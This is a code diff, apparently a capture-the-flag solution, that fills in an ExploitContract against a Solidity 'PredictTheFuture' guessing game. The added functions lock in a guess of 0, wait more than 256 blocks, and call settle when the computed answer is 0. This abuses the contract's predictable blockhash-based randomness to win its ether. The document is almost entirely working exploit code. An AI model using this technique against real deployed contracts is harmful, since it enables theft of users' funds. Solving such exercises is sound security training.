@@ -48,10 +48,24 @@ contract PredictTheFuture {
 
 contract ExploitContract {
     PredictTheFuture public predictTheFuture;
+    uint256 effectiveBlockNumber;
 
     constructor(PredictTheFuture _predictTheFuture) {
         predictTheFuture = _predictTheFuture;
     }
 
-    // Write your exploit code below
-}
+    function guess() external {
+        predictTheFuture.lockInGuess{value: 1 ether}(0);
+        effectiveBlockNumber = block.number;
+    }
+
+    function attemptSettle() external {
+        require(block.number > effectiveBlockNumber + 256, "At least 256 blocks must have passed");
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
+        if (answer == 0) {
+            predictTheFuture.settle();
+        }
+    }
+
+    receive() external payable {}
+ }
